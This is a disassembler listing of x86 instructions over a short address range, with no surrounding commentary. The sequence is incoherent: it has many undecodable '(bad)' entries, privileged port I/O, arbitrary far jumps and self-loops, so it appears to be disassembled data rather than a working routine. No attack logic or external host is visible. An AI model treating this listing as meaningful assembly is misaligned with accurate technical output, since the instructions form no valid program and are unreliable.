  6a37c7:	fdiv   DWORD PTR [esi-0x4a71c570]
  6a37cd:	cdq    
  6a37ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a37cf:	enter  0x4cfc,0xcb
  6a37d3:	in     al,0xfc
  6a37d5:	sbb    ch,0x97
  6a37d8:	ret    
  6a37d9:	mov    DWORD PTR [edi+edi*2-0x3bf30818],edx
  6a37e0:	push   es
  6a37e1:	inc    ecx
  6a37e2:	adc    BYTE PTR [ecx-0x5d1c043f],dh
  6a37e8:	or     DWORD PTR [eax],eax
  6a37ea:	enter  0xd7ca,0xab
  6a37ee:	jecxz  0x6a37c8
  6a37f0:	loopne 0x6a37f9
  6a37f2:	and    ch,BYTE PTR [edx+0x11]
  6a37f5:	xlat   BYTE PTR ds:[ebx]
  6a37f6:	add    al,0x77
  6a37f8:	cmp    DWORD PTR [bx],esi
  6a37fb:	shl    cl,0x51
  6a37fe:	(bad)  
  6a37ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a3800:	popf   
  6a3801:	test   al,0x1d
  6a3803:	fistp  QWORD PTR [ebx-0x3]
  6a3806:	push   0xc31563d9
  6a380b:	add    eax,0x494cfecf
  6a3810:	or     eax,0xfa1184e5
  6a3815:	aad    0xc0
  6a3817:	stos   BYTE PTR es:[edi],al
  6a3818:	call   0xdc979c7b
  6a381d:	mov    dl,0xf0
  6a381f:	inc    edi
  6a3820:	push   ds
  6a3821:	retf   
  6a3822:	pop    ebx
  6a3823:	sbb    eax,0x1ac2c79
  6a3828:	test   BYTE PTR [edx-0x65082376],cl
  6a382e:	cmp    DWORD PTR [eax+ebp*4+0x55],ebx
  6a3832:	cmp    esp,DWORD PTR [ebp+ecx*8+0x0]
  6a3836:	cmp    eax,0xc1530909
  6a383b:	or     esi,DWORD PTR [edx+0x8]
  6a383e:	add    al,0x95
  6a3840:	lahf   
  6a3841:	push   eax
  6a3842:	cli    
  6a3843:	sub    BYTE PTR [edi-0x6a],dh
  6a3846:	sahf   
  6a3847:	add    BYTE PTR [eax-0x7caec0b4],ch
  6a384d:	retf   0x7a88
  6a3850:	mov    edx,edi
  6a3852:	test   cl,al
  6a3854:	sub    ch,bh
  6a3856:	mov    al,ds:0x757ffec8
  6a385b:	jmp    0x1fc56cb0
  6a3860:	mov    esp,esi
  6a3862:	pop    ebp
  6a3863:	int    0xc4
  6a3865:	repnz dec esi
  6a3867:	ficomp WORD PTR [eax]
  6a3869:	in     eax,dx
  6a386a:	stos   BYTE PTR es:[edi],al
  6a386b:	and    ebp,esp
  6a386d:	cwde   
  6a386e:	sub    DWORD PTR [ebp+0x65d97ef6],ebx
  6a3874:	out    0x5d,eax
  6a3876:	push   0x37
  6a3878:	xor    BYTE PTR [ecx],ch
  6a387a:	mov    BYTE PTR [ebx-0x1f9a8b64],dl
  6a3880:	(bad)  [ebx-0x48]
  6a3883:	push   edx
  6a3884:	sbb    BYTE PTR [ebp+0x5],al
  6a3887:	mov    dh,0x1
  6a3889:	mov    ds:0xaabdb0c9,al
  6a388e:	iret   
  6a388f:	nop
  6a3890:	pop    ebp
  6a3891:	sahf   
  6a3892:	xor    eax,0x614dd8b4
  6a3897:	outs   dx,DWORD PTR ds:[esi]
  6a3898:	call   DWORD PTR [esi-0x25]
  6a389b:	xor    al,0x5
  6a389d:	mov    ecx,0x233215b1
  6a38a2:	iret   
  6a38a3:	in     eax,0xa0
  6a38a5:	jne    0x6a3876
  6a38a7:	fsub   DWORD PTR [ecx+eiz*2+0x50]
  6a38ab:	out    dx,al
  6a38ac:	and    ebp,DWORD PTR [edi+edi*4-0x78]
  6a38b0:	or     al,0x48
  6a38b2:	push   eax
  6a38b3:	shr    BYTE PTR ds:0x5d8e1929,1
  6a38b9:	inc    eax
  6a38ba:	jge    0x6a38d2
  6a38bc:	sbb    eax,0xb10865cf
  6a38c1:	pop    esp
  6a38c2:	xchg   esp,eax
  6a38c3:	hlt    
  6a38c4:	scas   al,BYTE PTR es:[edi]
  6a38c5:	xchg   esi,eax
  6a38c6:	daa    
  6a38c7:	test   BYTE PTR [eax+0x2c09631b],bh
  6a38cd:	out    0xad,eax
  6a38cf:	dec    esp
  6a38d0:	(bad)  
  6a38d1:	sti    
  6a38d2:	fs dec esp
  6a38d4:	cmp    al,0x8b
  6a38d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a38d7:	(bad)  
  6a38d8:	push   edi
  6a38da:	push   0x2d
  6a38dc:	jne    0x6a385f
  6a38de:	dec    ebp
  6a38df:	sbb    bh,BYTE PTR [ecx+edi*2-0x5d]
  6a38e3:	loopne 0x6a391d
  6a38e5:	arpl   WORD PTR [ecx],bp
  6a38e7:	jbe    0x6a392e
  6a38e9:	retf   0x6224
  6a38ec:	int    0xfd
  6a38ee:	sub    DWORD PTR [ebp+0x24],0xa7cd0429
  6a38f5:	int3   
  6a38f6:	fst    st(3)
  6a38f8:	xor    BYTE PTR [edx],0xc6
  6a38fb:	cmp    dl,BYTE PTR [ecx]
  6a38fd:	pop    esp
  6a38fe:	xchg   DWORD PTR [edi-0x4],eax
  6a3901:	enter  0xfbd7,0xfd
  6a3905:	inc    ecx
  6a3906:	call   0x754f975
  6a390b:	push   esi
  6a390c:	icebp  
  6a390d:	mov    eax,0x8a1c0cb
  6a3912:	adc    DWORD PTR [ebx],edx
  6a3914:	(bad)  
  6a3915:	int3   
  6a3916:	call   0x817a:0x5098ec47
  6a391d:	(bad)  
  6a391e:	cmp    eax,0xd59d9d7f
  6a3923:	ja     0x6a3909
  6a3925:	jne    0x6a3940
  6a3927:	icebp  
  6a3928:	repnz icebp 
  6a392a:	jb     0x30fd5bc4
  6a3930:	cmp    al,0x9e
  6a3932:	jg     0x6a3912
  6a3934:	or     sp,cx
  6a3937:	xor    BYTE PTR [eax+0x14e6b5d7],bl
  6a393d:	gs aam 0x97
  6a3940:	push   edx
  6a3941:	dec    edx
  6a3942:	sbb    BYTE PTR [esi+0x27],ch
  6a3945:	mov    ebp,0x7e9413b7
  6a394a:	sub    eax,edi
  6a394c:	out    dx,al
  6a394d:	or     edx,DWORD PTR [ebx-0x70]
  6a3950:	xchg   ecx,eax
  6a3951:	pop    esp
  6a3952:	push   edx
  6a3953:	adc    eax,0xf5b40f3b
  6a3958:	lds    edi,FWORD PTR [esi]
  6a395a:	add    al,0x6a
  6a395c:	ret    
  6a395d:	add    edi,0xffdf2c62
  6a3963:	gs jge 0x6a3906
  6a3966:	cld    
  6a3967:	xlat   BYTE PTR ds:[ebx]
  6a3968:	xchg   esi,eax
  6a3969:	in     eax,0x22
  6a396b:	sub    ah,BYTE PTR [edx+edx*4+0x1ec33176]
  6a3972:	jae    0x6a38fa
  6a3974:	pop    ds
  6a3975:	daa    
  6a3976:	xchg   ebx,eax
  6a3977:	je     0x6a3934
  6a3979:	xchg   BYTE PTR [ebx+0x5bc67be6],dl
  6a397f:	pop    ss
  6a3980:	mov    edx,edx
  6a3982:	mov    edx,0xdb318ca9
  6a3987:	push   0xffffffc7
  6a3989:	cdq    
  6a398a:	mov    ch,0x2b
  6a398c:	dec    esi
  6a398d:	jb     0x6a3910
  6a398f:	adc    ecx,DWORD PTR [ebx-0x35]
  6a3992:	or     eax,DWORD PTR [edx+0x71c13ed]
  6a3998:	jne    0x6a3998
  6a399a:	outs   dx,DWORD PTR ds:[esi]
  6a399b:	div    BYTE PTR [eax+0x30]
  6a399e:	fcom   DWORD PTR [esi]
  6a39a0:	dec    esi
  6a39a1:	push   edx
  6a39a2:	or     al,0xb2
  6a39a4:	scas   al,BYTE PTR es:[edi]
  6a39a5:	fmul   DWORD PTR [edx]
  6a39a7:	or     edi,DWORD PTR [ecx+0x3]
  6a39aa:	dec    edi
  6a39ab:	iret   
  6a39ac:	cdq    
  6a39ad:	int3   
  6a39ae:	jge    0x6a39d0
  6a39b0:	sti    
  6a39b1:	leave  
  6a39b2:	call   0xb2bef71f
  6a39b7:	(bad)  
  6a39b8:	aaa    
  6a39b9:	scas   al,BYTE PTR es:[edi]
  6a39ba:	das    
  6a39bb:	(bad)  
  6a39bc:	pop    ecx
  6a39bd:	cmp    bl,cl
  6a39bf:	aaa    
  6a39c0:	ror    ecx,1
  6a39c2:	aas    
  6a39c3:	mov    dl,0x6c
  6a39c5:	push   esi
  6a39c6:	js     0x6a3a37
  6a39c8:	inc    ebx
  6a39c9:	jmp    0xd8a6f0d6
  6a39ce:	(bad)  
  6a39cf:	out    0x98,al
  6a39d1:	test   DWORD PTR [edx+0x7db77457],ebx
  6a39d7:	out    dx,eax
  6a39d8:	ret    
  6a39d9:	add    eax,0x3ad97e4c
  6a39de:	in     al,0x6a
  6a39e0:	add    BYTE PTR [eax+0x5b316d03],al
  6a39e6:	ja     0x6a39df
  6a39e8:	and    eax,0x63bc10
  6a39ed:	ss inc eax
  6a39ef:	xor    DWORD PTR [edi-0x10],esp
  6a39f2:	(bad)
  6a39f5:	jp     0x6a39ef
  6a39f7:	fwait
  6a39f8:	and    eax,ecx
  6a39fa:	pop    esp
  6a39fb:	xchg   edx,eax
  6a39fc:	adc    cl,cl
  6a39fe:	dec    edx
  6a39ff:	mov    dh,0xbc
  6a3a01:	shl    BYTE PTR [ebp+0x38],cl
  6a3a04:	pop    ebp
  6a3a05:	aad    0x44
  6a3a07:	add    eax,0x74906e06
  6a3a0c:	mov    WORD PTR ds:0x6e75f615,gs
  6a3a12:	(bad)  
  6a3a13:	stos   DWORD PTR es:[edi],eax
  6a3a14:	fmul   QWORD PTR [edi+0x4f]
  6a3a17:	retf   0x18b1
  6a3a1a:	mov    esi,0xbd484fd4
  6a3a1f:	pushf  
  6a3a20:	arpl   WORD PTR [edi-0x1cd39e17],bp
  6a3a26:	or     al,0xde
  6a3a28:	push   ebx
  6a3a29:	or     BYTE PTR [eax],0x4
  6a3a2c:	inc    edx
  6a3a2d:	bnd jne 0x6a39b6
  6a3a30:	mov    edx,0x6e62678c
  6a3a35:	xor    cl,cl
  6a3a37:	mov    cl,0xb
  6a3a39:	sahf   
  6a3a3a:	js     0x6a3ab3
  6a3a3c:	mov    al,0xcb
  6a3a3e:	pop    ebp
  6a3a3f:	or     esp,esp
  6a3a41:	ins    DWORD PTR es:[edi],dx
  6a3a42:	xchg   ebp,eax
  6a3a43:	es fwait
  6a3a45:	inc    edx
  6a3a46:	out    dx,al
  6a3a47:	sbb    eax,0x71af1596
  6a3a4c:	push   eax
  6a3a4d:	or     DWORD PTR [ebx-0x49],ebp
  6a3a50:	retf   
  6a3a51:	adc    BYTE PTR [ecx-0x52],bl
  6a3a54:	out    dx,al
  6a3a55:	dec    eax
  6a3a56:	pop    esp
  6a3a57:	push   ecx
  6a3a58:	fwait
  6a3a59:	sbb    al,BYTE PTR es:[eax+eiz*1-0x30]
  6a3a5e:	pop    ds
  6a3a5f:	jmp    0xee54:0x29278648
  6a3a66:	xchg   esi,eax
  6a3a67:	or     dl,BYTE PTR [esi]
  6a3a69:	cmp    cl,bh
  6a3a6b:	retf   
  6a3a6c:	push   es
  6a3a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a3a6e:	inc    ecx
  6a3a6f:	mov    ds:0xd9d86e2a,al
  6a3a74:	jle    0x6a3af5
  6a3a76:	adc    cl,BYTE PTR [eax]
  6a3a78:	jmp    0x6ac3:0xfb9b1f95
  6a3a7f:	jbe    0x6a3ab4
  6a3a81:	dec    ebx
  6a3a82:	not    BYTE PTR [edi-0x9]
  6a3a85:	cmp    ebp,DWORD PTR [ebp+eax*4-0x6b618128]
  6a3a8c:	(bad)  
  6a3a8d:	adc    bl,BYTE PTR [eax+edx*8+0x2a400282]
  6a3a94:	jbe    0x6a3af3
  6a3a96:	enter  0xc24a,0xe2
  6a3a9a:	adc    eax,0xa2530715
  6a3a9f:	dec    ebp
  6a3aa0:	push   edi
  6a3aa1:	mov    ebp,0x568fc03a
  6a3aa6:	popf   
  6a3aa7:	frstor [edi+0xbc3de38]
  6a3aad:	mov    bl,bl
  6a3aaf:	mov    esi,?
  6a3ab1:	add    BYTE PTR ds:[ebp+ebx*2-0x183f98d7],al
  6a3ab9:	cdq    
  6a3aba:	mov    ah,0xeb
  6a3abc:	adc    BYTE PTR [eax+0x4f1b0493],0xaf
  6a3ac3:	ss hlt 
  6a3ac5:	rcl    DWORD PTR [edi-0x48107f84],1
  6a3acb:	mov    al,ds:0x88565935
  6a3ad0:	fnstcw WORD PTR [esi+0x48]
  6a3ad3:	repnz ficom WORD PTR [esi]
  6a3ad6:	mov    al,ds:0x2315798a
  6a3adb:	dec    ecx
  6a3adc:	cdq    
  6a3add:	mov    edx,0xc1b4aad7
  6a3ae2:	(bad)
  6a3ae6:	mov    eax,ds:0x43957da4
  6a3aeb:	and    dh,BYTE PTR [ebx]
  6a3aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a3aee:	scas   eax,DWORD PTR es:[edi]
  6a3aef:	jp     0x6a3abd
  6a3af1:	or     DWORD PTR [eax],eax
  6a3af3:	jnp    0x6a3abe
  6a3af5:	dec    edi
  6a3af6:	push   cs
  6a3af7:	loopne 0x6a3b64
  6a3af9:	xchg   esi,eax
  6a3afa:	mov    al,ds:0xbc1ed410
  6a3aff:	ret    
  6a3b00:	scas   al,BYTE PTR es:[edi]
  6a3b01:	inc    DWORD PTR [ecx-0x36]
  6a3b04:	lea    edx,[ebx-0x22]
  6a3b07:	mov    esi,0x26af666d
  6a3b0c:	pop    eax
  6a3b0d:	jns    0x6a3af9
  6a3b0f:	xchg   edi,eax
  6a3b10:	cdq    
  6a3b11:	mov    al,0xa9
  6a3b13:	outs   dx,DWORD PTR ss:[esi]
  6a3b15:	(bad)  
  6a3b16:	mov    eax,ds:0x5816217e
  6a3b1b:	and    eax,0x92267f7e
  6a3b20:	mov    ebp,0x24ad279e
  6a3b25:	sbb    dl,BYTE PTR [edi]
  6a3b27:	xor    al,bh
  6a3b29:	fimul  DWORD PTR [ecx+eiz*2+0x6b]
  6a3b2d:	mov    ebp,ebx
  6a3b2f:	popa   
  6a3b30:	mov    al,0x6f
  6a3b32:	retf   
  6a3b33:	mov    eax,0x8cb09103
  6a3b38:	aam    0x7b
  6a3b3a:	sub    DWORD PTR [ecx],ebx
  6a3b3c:	js     0x6a3af5
  6a3b3e:	xor    bl,ah
  6a3b40:	adc    dh,ah
  6a3b42:	les    esi,FWORD PTR [ecx+ecx*2]
  6a3b45:	out    dx,al
  6a3b46:	retf   0x1dd0
  6a3b49:	push   ecx
  6a3b4a:	test   BYTE PTR [ebp-0x612ac475],bh
  6a3b50:	xchg   ebx,eax
  6a3b51:	int    0x91
  6a3b53:	fsub   DWORD PTR [edi-0x2d]
  6a3b56:	cwde   
  6a3b57:	dec    edx
  6a3b58:	add    al,0x6e
  6a3b5a:	or     bh,BYTE PTR [eax+0x4c]
  6a3b5d:	and    BYTE PTR [ecx+0x55],ah
  6a3b60:	push   0x9cd0ef5a
  6a3b65:	or     al,0x39
  6a3b67:	and    eax,0x4c0f8d02
  6a3b6c:	add    esi,edi
  6a3b6e:	adc    al,0x88
  6a3b70:	jo     0x6a3baa
  6a3b72:	clc    
  6a3b73:	aad    0xbc
  6a3b75:	das    
  6a3b76:	pop    esp
  6a3b77:	cwde   
  6a3b78:	std    
  6a3b79:	(bad)  
  6a3b7a:	arpl   cx,cx
  6a3b7c:	sar    BYTE PTR [edi-0x5d],1
  6a3b7f:	(bad)  
  6a3b80:	push   ecx
  6a3b81:	push   es
  6a3b82:	scas   eax,DWORD PTR es:[edi]
  6a3b83:	enter  0x14dc,0xb3
  6a3b87:	mov    bh,0x28
  6a3b89:	adc    al,0x3c
  6a3b8b:	cdq    
  6a3b8c:	adc    esi,edi
  6a3b8e:	out    0xa,eax
  6a3b90:	hlt    
  6a3b91:	xor    al,0x13
  6a3b93:	pop    ebx
  6a3b94:	mov    ch,0xa8
  6a3b96:	lock and BYTE PTR [eax-0x56952a8],dh
  6a3b9d:	(bad)  [edx+0x73a54914]
  6a3ba3:	pop    es
  6a3ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a3ba5:	push   edx
  6a3ba6:	mov    ah,0x7a
  6a3ba8:	test   al,0xa
  6a3baa:	push   ds
  6a3bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a3bac:	add    al,0xc
  6a3bae:	dec    esi
  6a3baf:	sbb    esi,0x36
  6a3bb2:	fdivr  QWORD PTR [ebx-0x184c3c5b]
  6a3bb8:	fdivrp st(5),st
  6a3bba:	addr16 es (bad) 
  6a3bbe:	jo     0x6a3b9e
  6a3bc0:	(bad)  
  6a3bc1:	repnz mov ds:0x937193cc,al
  6a3bc7:	aaa    
  6a3bc8:	jno    0x6a3c43
  6a3bca:	aam    0x60
  6a3bcc:	adc    dl,BYTE PTR cs:[ebp+edi*2+0x30a29079]
  6a3bd4:	sbb    eax,0x74a7d3c7
  6a3bd9:	int    0x65
  6a3bdb:	push   ds
  6a3bdc:	test   BYTE PTR [ebp+edi*1-0x24],dh
  6a3be0:	ficomp DWORD PTR [eax]
  6a3be2:	mov    eax,ds:0x4a7b2a88
  6a3be7:	lods   al,BYTE PTR ds:[esi]
  6a3be8:	iret   
  6a3be9:	aaa    
  6a3bea:	add    al,0x7d
  6a3bec:	xchg   edi,eax
  6a3bed:	scas   al,BYTE PTR es:[edi]
  6a3bee:	xchg   ebp,eax
  6a3bef:	or     esi,DWORD PTR [ecx+edx*1]
  6a3bf2:	fldenv [esi+eiz*2+0x4f6ed75f]
  6a3bf9:	ficomp DWORD PTR ds:0x6b9f2498
  6a3bff:	stos   DWORD PTR es:[edi],eax
  6a3c00:	push   es
  6a3c01:	addr16 mov dh,0x8d
  6a3c04:	js     0x6a3c51
  6a3c06:	call   0xaa35e95d
  6a3c0b:	add    BYTE PTR [edi+edx*1+0x764d642e],bl
  6a3c12:	(bad)  
  6a3c13:	fs cmp al,0xbc
  6a3c16:	(bad)  
  6a3c17:	pop    es
  6a3c18:	jnp    0x6a3c84
  6a3c1a:	xlat   BYTE PTR ds:[ebx]
  6a3c1b:	push   cs
  6a3c1c:	mov    ds:0xb69a519b,al
  6a3c21:	iret   
  6a3c22:	mov    al,ds:0x82afa378
  6a3c27:	mov    bl,0xf5
  6a3c29:	jle    0x6a3c0b
  6a3c2b:	sbb    al,0x51
  6a3c2d:	add    eax,0xc1dbee06
  6a3c32:	dec    edi
  6a3c33:	out    0xac,eax
  6a3c35:	cmp    cl,0x4a
  6a3c38:	mov    eax,0xc174581
  6a3c3d:	(bad)  
  6a3c3e:	loop   0x6a3cae
  6a3c40:	or     eax,0xf14afa0f
  6a3c45:	cmc    
  6a3c46:	jge    0x6a3bfb
  6a3c48:	mov    dl,BYTE PTR [esi+edx*2-0x3f412cb1]
  6a3c4f:	cmc    
  6a3c50:	push   ebp
  6a3c51:	sub    ebx,DWORD PTR [edx-0x651d32f]
  6a3c57:	push   esp
  6a3c58:	adc    esp,DWORD PTR [edi]
  6a3c5a:	hlt    
  6a3c5b:	(bad)  
  6a3c5c:	ds jmp 0x770b3521
  6a3c62:	add    eax,0x23ec1190
  6a3c67:	pop    ecx
  6a3c68:	mov    al,ds:0xac778f89
  6a3c6d:	popa   
  6a3c6e:	jg     0x6a3c7e
  6a3c70:	gs mov ah,bl
  6a3c73:	popf   
  6a3c74:	mov    ecx,0xfcf761d3
  6a3c79:	(bad)  fs:[edi+0x58]
  6a3c7d:	push   ebp
  6a3c7e:	(bad)  
  6a3c7f:	lea    ecx,[ebx]
  6a3c81:	pop    ds
  6a3c82:	scas   eax,DWORD PTR es:[edi]
  6a3c83:	pop    esi
  6a3c84:	and    ch,BYTE PTR [ebx+0x6]
  6a3c87:	or     eax,0xcfc82055
  6a3c8c:	inc    esp
  6a3c8d:	inc    esp
  6a3c8e:	push   eax
  6a3c8f:	fs add edi,ebx
  6a3c92:	inc    esp
  6a3c93:	jl     0x6a3cc1
  6a3c95:	mov    edi,0xcfb0b074
  6a3c9a:	mov    esi,0x106cbef3
  6a3c9f:	mov    bl,0x25
  6a3ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a3ca2:	sub    eax,0x715cec03
  6a3ca7:	jmp    DWORD PTR [edi]
  6a3ca9:	mov    ah,0x97
  6a3cab:	arpl   ax,sp
  6a3cad:	xchg   edi,eax
  6a3cae:	ret    0xd37e
  6a3cb1:	ins    BYTE PTR es:[edi],dx
  6a3cb2:	test   eax,0x1a1a3f6a
  6a3cb7:	scas   al,BYTE PTR es:[edi]
  6a3cb8:	dec    esi
  6a3cb9:	dec    edx
  6a3cba:	hlt    
  6a3cbb:	sub    ch,BYTE PTR [esi+0x4c]
  6a3cbe:	inc    esi
  6a3cbf:	jmp    0x784e:0x40fc886
  6a3cc6:	ss xor al,0x76
  6a3cc9:	add    al,0xd
  6a3ccb:	push   ecx
  6a3ccc:	ret    0xeee1
  6a3ccf:	xor    dh,bl
  6a3cd1:	mov    al,0x71
  6a3cd3:	inc    esp
  6a3cd4:	xchg   ecx,eax
  6a3cd5:	mov    ebx,0x66650893
  6a3cda:	pusha  
  6a3cdb:	lahf   
  6a3cdc:	fmul   QWORD PTR ds:0x356f028c
  6a3ce2:	call   0x65d29abf
  6a3ce7:	das    
  6a3ce8:	pop    ecx
  6a3ce9:	shr    DWORD PTR [ecx+0x47],cl
  6a3cec:	sub    dh,cl
  6a3cee:	out    0x94,al
  6a3cf0:	sbb    eax,0x4513daa5
  6a3cf5:	jbe    0x6a3d4f
  6a3cf7:	mov    dh,0x9
  6a3cf9:	ret    
  6a3cfa:	push   ss
  6a3cfb:	cmp    al,0xf4
  6a3cfd:	(bad)  
  6a3cff:	rcr    BYTE PTR [esp+edx*2],cl
  6a3d02:	ins    BYTE PTR es:[edi],dx
  6a3d03:	pop    esp
  6a3d04:	jne    0x6a3d04
  6a3d06:	mov    DWORD PTR [ecx+0x9b8da5d],ebx
  6a3d0c:	cmp    cl,BYTE PTR [ebx-0x74]
  6a3d0f:	popa   
  6a3d10:	sub    BYTE PTR [eax],bl
  6a3d12:	mov    dh,0x46
  6a3d14:	mov    edi,0x74b93f5b
  6a3d19:	aad    0x10
  6a3d1b:	div    BYTE PTR [ebx+0x343fe28c]
  6a3d21:	lods   al,BYTE PTR ds:[esi]
  6a3d22:	adc    ecx,ebx
  6a3d24:	cmp    ch,ah
  6a3d26:	jl     0x6a3d13
  6a3d28:	out    0x24,al
  6a3d2a:	add    esp,DWORD PTR [ebx-0x72]
  6a3d2d:	push   esp
  6a3d2e:	stc    
  6a3d2f:	jae    0x6a3d06
  6a3d31:	dec    ebx
  6a3d32:	pop    ebp
  6a3d33:	lahf   
  6a3d34:	xchg   esp,eax
  6a3d35:	xor    DWORD PTR [edx+0x1bc310df],ecx
  6a3d3b:	mov    esi,0xdc24ba0b
  6a3d40:	dec    edi
  6a3d41:	adc    BYTE PTR [ebp+ecx*4-0x2e],ah
  6a3d45:	mov    al,ds:0xcbeb4663
  6a3d4a:	push   0xdbf05aa2
  6a3d4f:	push   ds
  6a3d50:	call   0xa09f0f99
  6a3d55:	out    dx,eax
  6a3d56:	sar    esp,cl
  6a3d58:	cwde   
  6a3d59:	mov    ah,dl
  6a3d5b:	push   ss
  6a3d5c:	pop    ds
  6a3d5d:	jo     0x6a3ce1
  6a3d5f:	ins    DWORD PTR es:[edi],dx
  6a3d60:	lahf   
  6a3d61:	dec    ecx
  6a3d62:	outs   dx,BYTE PTR ds:[esi]
  6a3d63:	loope  0x6a3d85
  6a3d65:	lea    ebx,[ebx+0x27]
  6a3d68:	popf   
  6a3d69:	in     eax,0x6
  6a3d6b:	cmp    al,0xc9
  6a3d6d:	fldenv [ebx+0x6a]
  6a3d70:	fnstsw WORD PTR [ebx-0x6e]
  6a3d73:	sbb    bl,dh
  6a3d75:	jp     0x6a3dd9
  6a3d77:	sti    
  6a3d78:	xlat   BYTE PTR ds:[ebx]
  6a3d79:	call   0xc84a:0xff841943
  6a3d80:	inc    esp
  6a3d81:	and    BYTE PTR [ebx-0x3b],0x7d
  6a3d85:	inc    ebx
  6a3d86:	aad    0xe1
  6a3d88:	fidiv  WORD PTR [esi+0x4a358ec3]
  6a3d8e:	mov    al,0xbe
  6a3d90:	rcr    DWORD PTR [ecx-0xe165dae],1
  6a3d96:	sub    BYTE PTR [ebx+0x65586f25],0xc5
  6a3d9d:	pusha  
  6a3d9e:	and    DWORD PTR [ecx+0x1e2c4c1],eax
  6a3da4:	lods   al,BYTE PTR ds:[esi]
  6a3da5:	push   ds
  6a3da6:	test   BYTE PTR [edi+0x75],al
  6a3da9:	rol    BYTE PTR [eax-0x79],cl
  6a3dac:	fs push es
  6a3dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a3daf:	pushf  
  6a3db0:	add    al,0xa5
  6a3db2:	aas    
  6a3db3:	ss loop 0x6a3e08
  6a3db6:	add    ch,BYTE PTR [eax]
  6a3db8:	xchg   ebp,eax
  6a3db9:	popa   
  6a3dba:	inc    eax
  6a3dbb:	fstp   TBYTE PTR [ecx]
  6a3dbd:	sbb    BYTE PTR [edi+0x56a6d1af],dl
  6a3dc3:	ins    DWORD PTR es:[edi],dx
  6a3dc4:	cs fs clc 
  6a3dc7:	cmp    DWORD PTR [edx+0x21c1f3f6],eax
  6a3dcd:	int3   
  6a3dce:	xor    eax,eax
  6a3dd0:	lods   al,BYTE PTR ds:[esi]
  6a3dd1:	mul    al
  6a3dd3:	adc    edi,DWORD PTR [edi+0x46d553a8]
  6a3dd9:	sbb    eax,0xdb56825b
  6a3dde:	mov    ds:0xf9f4296f,eax
  6a3de3:	mov    esp,0xfcd3d45a
  6a3de8:	inc    ecx
  6a3de9:	and    DWORD PTR [ecx-0x61],esp
  6a3dec:	addr16 mov eax,0x58202d91
  6a3df2:	imul   BYTE PTR [ebx]
  6a3df4:	in     al,dx
  6a3df5:	repz in eax,dx
  6a3df7:	xor    bh,BYTE PTR [eax]
  6a3df9:	mov    ah,0x4f
  6a3dfb:	sub    esi,ebx
  6a3dfd:	out    dx,al
  6a3dfe:	jnp    0x6a3da8
  6a3e00:	ds in  eax,dx
  6a3e02:	push   0xaf13e2fd
  6a3e07:	dec    ecx
  6a3e08:	bnd jle 0x6a3e23
  6a3e0b:	imul   esi,ecx,0xffffff90
  6a3e0e:	fadd   QWORD PTR [ebx+0x58]
  6a3e11:	dec    ebp
  6a3e12:	adc    eax,DWORD PTR [ebx-0x64]
  6a3e15:	jl     0x6a3ddc
  6a3e17:	adc    ecx,esi
  6a3e19:	adc    eax,0xb67fd65f
  6a3e1e:	daa    
  6a3e1f:	mov    edi,0xfe6c9551
  6a3e24:	sbb    al,0xb1
  6a3e26:	adc    edx,esp
  6a3e28:	fnstenv [esi-0x24]
  6a3e2b:	out    dx,eax
  6a3e2c:	adc    eax,DWORD PTR [ecx+0x103333c6]
  6a3e32:	in     eax,0x2d
  6a3e34:	out    0x80,eax
  6a3e36:	movlhps xmm4,xmm0
  6a3e39:	inc    eax
  6a3e3a:	fstp   QWORD PTR [edi]
  6a3e3c:	out    dx,eax
  6a3e3d:	push   edi
  6a3e3e:	xor    dl,BYTE PTR [esi-0x62e29f4d]
  6a3e44:	push   0x6f
  6a3e46:	adc    ecx,eax
  6a3e48:	pusha  
  6a3e49:	(bad)  [ebx+ebx*8]
  6a3e4c:	adc    esp,edx
  6a3e4e:	in     eax,0xe5
  6a3e50:	pop    edx
  6a3e51:	lods   eax,DWORD PTR ds:[esi]
  6a3e52:	sbb    DWORD PTR [ebx+0x15a88e64],0x1a946590
  6a3e5c:	mov    cl,0x5f
  6a3e5e:	shl    dh,0x4c
  6a3e61:	mov    es,eax
  6a3e63:	xchg   ebx,eax
  6a3e64:	xsaveopt [eax+esi*2+0x3eaf01b7]
  6a3e6c:	jmp    0x56c7:0xe7537313
  6a3e73:	mov    eax,0x605b892a
  6a3e78:	pop    es
  6a3e79:	repz test BYTE PTR [ebx],bh
  6a3e7c:	or     BYTE PTR [ebx],ah
  6a3e7e:	jg     0x6a3e16
  6a3e80:	ss xor ebx,ecx
  6a3e83:	mov    esp,0x2566784b
  6a3e88:	cmp    al,0x22
  6a3e8a:	pop    ecx
  6a3e8b:	jnp    0x6a3e3a
  6a3e8d:	xor    BYTE PTR [ebp-0x26f3fb76],al
  6a3e93:	xor    DWORD PTR [eax+0x52],ebx
  6a3e96:	sbb    cl,ch
  6a3e98:	mov    ebp,0xaba43592
  6a3e9d:	or     ecx,DWORD PTR [edx-0x27]
  6a3ea0:	or     BYTE PTR [esi-0x29],cl
  6a3ea3:	data16 int3 
  6a3ea5:	mov    ecx,0xc46fd9c1
  6a3eaa:	mov    edi,0xe5d730b2
  6a3eaf:	(bad)  
  6a3eb0:	push   edx
  6a3eb1:	cmp    bl,0x61
  6a3eb4:	not    ecx
  6a3eb6:	jns    0x6a3f33
  6a3eb8:	outs   dx,BYTE PTR ds:[esi]
  6a3eb9:	mov    ds:0x5aa8beca,eax
  6a3ebe:	loopne 0x6a3eec
  6a3ec0:	les    eax,FWORD PTR [ebx-0x9]
  6a3ec3:	scas   eax,DWORD PTR es:[edi]
  6a3ec4:	push   eax
  6a3ec5:	(bad)  
  6a3ec6:	push   ebx
  6a3ec7:	cmp    eax,0xb26cb827
  6a3ecc:	std    
  6a3ecd:	inc    eax
  6a3ece:	pop    eax
  6a3ecf:	sub    eax,0x1a30f51c
  6a3ed4:	ret    0xa99d
  6a3ed7:	and    BYTE PTR [esi+0x12],bh
  6a3eda:	cmp    eax,DWORD PTR [ecx-0x350554bc]
  6a3ee0:	shr    dl,cl
  6a3ee2:	mov    cl,0x50
  6a3ee4:	das    
  6a3ee5:	xor    eax,0x62cd0704
